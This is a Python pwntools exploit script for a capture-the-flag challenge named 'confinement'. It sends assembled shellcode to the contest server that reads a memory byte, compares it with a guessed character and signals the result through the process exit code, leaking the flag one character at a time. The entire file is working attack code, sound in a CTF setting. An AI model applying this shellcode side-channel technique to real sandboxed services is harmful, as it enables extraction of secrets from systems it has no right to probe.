from pwn import *

exe = ELF('./confinement')
libc = ELF('./libc.so.6')
context.binary = exe.path

def check(index, c):
    # io = process(exe.path)
    io = remote("tamuctf.com", 443, ssl=True, sni="confinement")
    code = asm(f"""
        mov r9, [rsp]
        mov eax, [r9 + 150874 + {index}]
        cmp al, '{c}'
        je match
        mov eax, 231
        mov edi, 1
        syscall
    match:
        mov eax, 231
        mov edi, 0
        syscall
    """)
    io.sendline(code)
    res = io.recvline().decode().strip()
    io.close()
    return res == 'adios'

# flag = "gigem{"
flag = "gigem{3xf1l_5ucc3ss"
while flag[-1] != '}':
    for c in "!_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}":
        if check(len(flag), c):
            flag += c
            break
    else:
        print("NOOOOO")
        exit()
    print(flag)
